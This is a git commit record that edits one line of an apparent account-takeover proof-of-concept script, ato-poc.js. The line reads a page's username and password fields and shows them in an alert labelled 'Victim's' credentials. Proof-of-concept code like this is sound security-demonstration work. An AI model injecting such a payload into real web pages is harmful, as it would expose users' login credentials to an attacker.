2e68b430e0b4e3f6420c3a39beb189d41f4d95ce
haxuanhuy <52565807+haxuanhuy@users.noreply.github.com>
2025-09-19 22:57:55 +0700

    Update ato-poc.js

--- ato-poc.js
+++ ato-poc.js
@@ -1,1 +1,1 @@
-alert("Victim's email: "+document.getElementById('username').value+"\nVictim's Password:"+document.getElementById('password').value)
+alert("Victim's phone: "+document.getElementById('username').value+"\nVictim's Password:"+document.getElementById('password').value)
